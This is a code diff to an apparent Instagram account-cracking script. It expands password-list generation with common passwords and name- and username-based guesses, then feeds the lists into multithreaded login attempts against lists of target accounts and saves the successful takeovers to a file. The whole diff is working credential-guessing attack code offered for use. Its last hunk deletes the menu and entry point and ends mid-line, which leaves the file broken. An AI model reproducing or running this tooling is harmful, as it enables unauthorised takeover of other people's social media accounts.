@@ -65,9 +65,122 @@ def logo():
 """
     print(logo_text)
 
-def generate_passwords_from_patterns(user_id, name, patterns):
-    """Generate passwords from user-defined patterns"""
+def load_default_passwords():
+    """Load default/common passwords from file or generate"""
+    default_passwords = []
+    
+    # Try to load from common password file
+    password_files = [
+        '/sdcard/passwords.txt',
+        '/sdcard/pass.txt',
+        '/sdcard/wordlist.txt',
+        'passwords.txt',
+        'pass.txt',
+        'wordlist.txt'
+    ]
+    
+    for pass_file in password_files:
+        try:
+            with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
+                default_passwords = [line.strip() for line in f if line.strip()]
+                print(f'{G1}[{A}+{G1}]{G1} Loaded {len(default_passwords)} passwords from {pass_file}')
+                return default_passwords[:100]  # Limit to 100 passwords
+        except FileNotFoundError:
+            continue
+    
+    # If no password file found, use built-in common passwords
+    common_passwords = [
+        # Most common passwords
+        '123456', '12345678', '123456789', '12345', '1234567',
+        'password', 'password1', 'password123', 'qwerty', 'abc123',
+        'admin', 'admin123', 'welcome', 'welcome123', 'monkey',
+        'letmein', 'dragon', 'baseball', 'football', 'iloveyou',
+        'master', 'sunshine', 'superman', '1qaz2wsx', 'qazwsx',
+        '123qwe', '654321', '111111', '123123', '555555',
+        
+        # Instagram specific
+        'instagram', 'instagram123', 'insta', 'insta123',
+        'ig', 'ig123', 'ig2024', 'insta2024',
+        
+        # Year variations
+        '2024', '2023', '2022', '2021', '2020',
+        
+        # Name combinations
+        'love', 'love123', 'baby', 'baby123', 'angel', 'angel123',
+        'prince', 'princess', 'king', 'queen', 'star', 'star123',
+        
+        # Special character passwords
+        '123!@#', '!@#$%^', 'pass@123', 'admin@123',
+        
+        # Phone number patterns
+        '1234567890', '0987654321', '0123456789',
+        
+        # Simple patterns
+        '123abc', 'abc123', 'test123', 'demo123',
+        'hello123', 'world123', 'newpassword',
+        
+        # Strong common passwords
+        'P@ssw0rd', 'P@ssw0rd123', 'Admin@123',
+        'Welcome@123', 'Password@123'
+    ]
+    
+    print(f'{Y}[{A}!{Y}]{Y} Using built-in common password list')
+    return common_passwords
+
+def generate_userid_variations(userid):
+    """Generate UID/UserID variations"""
+    variations = []
+    
+    # Basic variations
+    variations.extend([
+        userid,
+        userid.lower(),
+        userid.upper(),
+        userid[:6],
+        userid[:8],
+        userid[-6:],
+        userid[-8:],
+        userid.replace('_', ''),
+        userid.replace('_', '.'),
+        userid.replace('_', ''),
+        userid.replace('.', ''),
+    ])
+    
+    # Check if it might be an email
+    if '@' in userid:
+        username = userid.split('@')[0]
+        variations.extend([
+            username,
+            username.lower(),
+            username[:6],
+            username[:8],
+        ])
+    
+    # Check if it's numeric
+    if userid.isdigit():
+        variations.extend([
+            userid[:4],
+            userid[:5],
+            userid[-4:],
+            userid[-5:],
+        ])
+    
+    # Remove duplicates
+    unique_vars = []
+    seen = set()
+    for var in variations:
+        if var and var not in seen:
+            seen.add(var)
+            unique_vars.append(var)
+    
+    return unique_vars
+
+def generate_passwords_from_patterns(userid, name, patterns, include_default=True):
+    """Generate passwords from user-defined patterns with UID variations"""
     passwords = []
+    
+    # Get UID variations
+    uid_variations = generate_userid_variations(userid)
     
     if name:
         # Split name into first and last
@@ -79,10 +192,10 @@ def generate_passwords_from_patterns(user_id, name, patterns):
             fs = name
             ls = name
     else:
-        fs = user_id
-        ls = user_id
+        fs = userid
+        ls = userid
     
-    full_name = name if name else user_id
+    full_name = name if name else userid
     
     # Apply each pattern
     for pattern in patterns:
@@ -90,53 +203,99 @@ def generate_passwords_from_patterns(user_id, name, patterns):
         ps = pattern.replace('first', fs.lower()).replace('First', fs)
         ps = ps.replace('last', ls.lower()).replace('Last', ls)
         ps = ps.replace('Name', full_name).replace('name', full_name.lower())
+        
+        # Add the base pattern
         passwords.append(ps)
+        
+        # Add UID variations combined with patterns
+        for uid_var in uid_variations[:5]:  # Limit to first 5 UID variations
+            passwords.extend([
+                uid_var,
+                uid_var + '123',
+                uid_var + '1234',
+                uid_var + '12345',
+                uid_var + '@123',
+                uid_var + '!@#',
+                '123' + uid_var,
+                uid_var + '2024',
+                uid_var + '2023',
+                ps + uid_var,
+                uid_var + ps,
+            ])
     
-    # Always add some common patterns
-    common_passwords = [
-        user_id,
-        user_id[:6],
-        user_id[:8],
-        '123456',
-        '12345678',
-        'password',
-        'Password',
-        'qwerty',
-        'admin',
-        'welcome',
-        'iloveyou',
-        'monkey',
-        '57273200',
-        fs.lower(),
-        fs.lower() + '123',
-        fs.lower() + '1234',
-        fs.lower() + '12345',
-        fs,
-        fs + '123',
-        fs + '1234',
-        fs + '12345',
-        ls.lower(),
-        ls.lower() + '123',
-        ls,
-        ls + '123',
-        full_name.lower(),
-        full_name.lower() + '123',
-        full_name.lower() + '1234',
-        full_name,
-        full_name + '123'
-    ]
+    # Add standalone UID variations
+    passwords.extend(uid_variations)
     
-    passwords.extend(common_passwords)
+    # Add name-based variations (if name exists)
+    if name:
+        passwords.extend([
+            fs.lower(),
+            fs.lower() + '123',
+            fs.lower() + '1234',
+            fs.lower() + '12345',
+            fs,
+            fs + '123',
+            fs + '1234',
+            fs + '12345',
+            ls.lower(),
+            ls.lower() + '123',
+            ls,
+            ls + '123',
+            full_name.lower(),
+            full_name.lower() + '123',
+            full_name.lower() + '1234',
+            full_name,
+            full_name + '123',
+            fs.lower() + ls.lower(),      # johndoe
+            fs + ls,                      # JohnDoe
+            ls.lower() + fs.lower(),      # doejohn
+            ls + fs,                      # DoeJohn
+            fs.lower() + '.' + ls.lower(),# john.doe
+            fs[0].lower() + ls.lower(),   # jdoe
+            fs[0] + ls,                   # JDoe
+        ])
     
-    # Remove duplicates
+    # Add common/default passwords if requested
+    if include_default:
+        default_passwords = load_default_passwords()
+        passwords.extend(default_passwords)
+    else:
+        # Still add some basic common passwords
+        passwords.extend([
+            '123456',
+            '12345678',
+            'password',
+            'Password',
+            'qwerty',
+            'admin',
+            'welcome',
+            'iloveyou',
+            'monkey',
+            '57273200',
+        ])
+    
+    # Add numeric combinations
+    for i in range(100):
+        passwords.append(str(i).zfill(2))
+        passwords.append(str(i).zfill(3))
+    
+    for i in [123, 1234, 12345, 123456, 111, 222, 333, 444, 555, 666, 777, 888, 999]:
+        passwords.extend([
+            str(i),
+            fs.lower() + str(i),
+            fs + str(i),
+            userid + str(i),
+        ])
+    
+    # Remove duplicates and empty passwords
     unique_passwords = []
     seen = set()
     for pw in passwords:
-        if pw and pw not in seen:
+        if pw and pw not in seen and len(pw) >= 4 and len(pw) <= 30:
             seen.add(pw)
             unique_passwords.append(pw)
     
-    return unique_passwords
+    return unique_passwords[:200]  # Limit to 200 passwords
 
 def crack_account(uid, password_list, total_count, name=None):
     """Crack a single Instagram account"""
@@ -351,6 +510,16 @@ def advanced_cracking():
         advanced_cracking()
         return
     
+    # Ask if user wants to include default passwords
+    clear()
+    logo()
+    print(f'{G1}[{A}?{G2}]{G2} INCLUDE DEFAULT PASSWORDS?')
+    print(f'{G1}[{A}1{G2}]{G2} Yes (Recommended)')
+    print(f'{G1}[{A}2{G2}]{G2} No (Only use custom patterns)')
+    linex()
+    use_default = input(f'{G1}[{A}?{G2}]{G2} SELECT OPTION {A}:{G2} ')
+    include_default = (use_default == '1')
+    
     # Get password patterns from user
     dplist = []
     clear()
@@ -364,6 +533,7 @@ def advanced_cracking():
     print(f'\n{G1}[{A}\\{G2}]{G2} EXAMPLE PATTERNS: {A}firstlast, First123, name123, firstname')
     print(f'{G1}[{A}ℹ{G2}]{G2} Use keywords: first, First, last, Last, name, Name')
     print(f'{G1}[{A}ℹ{G2}]{G2} These will be replaced with actual user names')
+    print(f'{G1}[{A}ℹ{G2}]{G2} UID variations will be automatically added')
     linex()
     
     for i in range(pass_limit):
@@ -388,14 +558,40 @@ def advanced_cracking():
     clear()
     logo()
     total_ids = str(len(dx))
+    
+    # Show password generation info
     print(f'{G1}[{A}+{G1}]{G1} TOTAL IDS {A}:{G1} {total_ids}')
     print(f'{G1}[{A}+{G1}]{G1} PATTERNS {A}:{G2} {", ".join(dplist)}')
+    print(f'{G1}[{A}+{G1}]{G1} DEFAULT PASSWORDS {A}:{G2} {"YES" if include_default else "NO"}')
+    print(f'{G1}[{A}+{G1}]{G1} UID VARIATIONS {A}:{G2} INCLUDED')
     print(f'{G1}[{A}+{G1}]{G1} IF NO RESULT {A}[{Y}ON{A}/{Y}OFF{A}] {G1}AIRPLANE MODE')
+    
+    # Show sample for first user
+    if dx:
+        sample_user = dx[0]
+        if '|' in sample_user:
+            sample_id, sample_name = sample_user.split('|', 1)
+            sample_id = sample_id.strip()
+            sample_name = sample_name.strip()
+        else:
+            sample_id = sample_user.strip()
+            sample_name = None
+        
+        sample_passwords = generate_passwords_from_patterns(sample_id, sample_name, dplist, include_default)
+        print(f'\n{G1}[{A}🔍{G1}]{G1} SAMPLE FOR FIRST USER:')
+        print(f'{G1}[{A}👤{G1}]{G1} UID: {A}{sample_id}')
+        if sample_name:
+            print(f'{G1}[{A}📝{G1}]{G1} NAME: {A}{sample_name}')
+        print(f'{G1}[{A}🔑{G1}]{G1} TOTAL PASSWORDS TO TRY: {A}{len(sample_passwords)}')
+        print(f'{G1}[{A}📋{G1}]{G1} FIRST 5 PASSWORDS:')
+        for i, pw in enumerate(sample_passwords[:5], 1):
+            print(f'  {G1}[{A}{i}{G1}]{G1} {pw}')
+    
     linex()
     
     start_time = time.time()
     
-    # Use ThreadPoolExecutor instead of ThreadPool
+    # Use ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=30) as executor:
         futures = []
         
@@ -413,7 +609,7 @@ def advanced_cracking():
                 names = None
             
             # Generate passwords for this user
-            passlist = generate_passwords_from_patterns(ids, names, dplist)
+            passlist = generate_passwords_from_patterns(ids, names, dplist, include_default)
             
             # Submit task
             future = executor.submit(crack_account, ids, passlist, len(dx), names)
@@ -441,10 +637,17 @@ def advanced_cracking():
     print(f'{G1}[{A}+{G1}]{G1} SUCCESSFUL {A}:{G1} {len(oks)}')
     print(f'{G1}[{A}+{G1}]{G1} FAILED {A}:{R} {len(cps)}')
     print(f'{G1}[{A}+{G1}]{G1} TIME TAKEN {A}:{Y} {execution_time:.2f}s')
+    print(f'{G1}[{A}+{G1}]{G1} PASSWORDS TESTED PER ID: {A}~{len(sample_passwords) if dx else 0}')
     linex()
     
     if len(oks) > 0:
         print(f'{G1}[{A}🎉{G1}]{G1} SUCCESSFUL ACCOUNTS SAVED TO /sdcard/SUCCESS_ACCOUNTS.txt')
+        print(f'{G1}[{A}+{G1}]{G1} FIRST 3 SUCCESSES:')
+        for i, uid in enumerate(oks[:3], 1):
+            print(f'  {G1}[{A}{i}{G1}]{G1} {uid}')
+    
+    if len(cps) > 0:
+        print(f'\n{Y}[{A}⚠{Y}]{Y} CHALLENGE/CHECKPOINT ACCOUNTS SAVED TO SEPARATE FILES')
     
     input(f'\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...')
 
@@ -455,6 +658,7 @@ def file_crack():
     linex()
     print(f'{G1}[{A}ℹ{G2}]{G2} File Format: username|Full Name (one per line)')
     print(f'{G1}[{A}ℹ{G2}]{G2} Example: john_doe234|John Doe')
+    print(f'{G1}[{A}ℹ{G2}]{G2} Automatically includes UID variations and common passwords')
     linex()
     
     # Voice prompt
@@ -503,7 +707,7 @@ def file_crack():
                     name = None
                 
                 # Generate passwords for this user
-                password_patterns = generate_passwords_from_patterns(uid, name, default_patterns)
+                password_patterns = generate_passwords_from_patterns(uid, name, default_patterns, include_default=True)
                 
                 # Submit task
                 future = executor.submit(crack_account, uid, password_patterns, len(user_list), name)
@@ -562,6 +766,7 @@ def show_statistics():
     print(f"  └─ \033[1;92mSUCCESS_ACCOUNTS.txt")
     print(f"  └─ \033[1;93mCHALLENGE_ACCOUNTS.txt")
     print(f"  └─ \033[1;91mCHECKPOINT_ACCOUNTS.txt")
+    print(f" \033[1;97m[🔑] Common passwords loaded from default files")
     linex()
     input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
 
@@ -570,58 +775,4 @@ def menu():
     while True:
         clear()
         logo()
-        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 📁 Simple File Cracking")
-        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 🎯 Advanced Cracking (Custom Patterns)")
-        print(f" \033[1;97m[\033[1;92m3\033[1;97m] 📊 View Statistics")
-        print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
-        print(f"\033[1;96m{'='*60}")
-        
-        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
-        
-        if choice == '1':
-            file_crack()
-        elif choice == '2':
-            advanced_cracking()
-        elif choice == '3':
-            show_statistics()
-        elif choice == '4':
-            clear()
-            print(f"\033[1;92m{'='*56}")
-            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
-            print(f"\033[1;92m{'='*56}")
-            print(f" \033[1;93m[!] Results saved in /sdcard/")
-            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
-            time.sleep(3)
-            break
-        else:
-            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, 3, or 4.")
-            time.sleep(2)
-
-if __name__ == "__main__":
-    try:
-        # Check for required modules
-        required_modules = ['requests', 'urllib.request']
-        missing_modules = []
-        
-        for module in required_modules:
-            try:
-                __import__(module)
-            except ImportError:
-                missing_modules.append(module)
-        
-        if missing_modules:
-            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
-            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
-            sys.exit(1)
-        
-        # Start the main menu
-        menu()
-        
-    except KeyboardInterrupt:
-        clear()
-        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
-        sys.exit(0)
-    except Exception as e:
-        clear()
-        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
-        sys.exit(1)
+        print(f" \033[1;97m[\033[1;92m
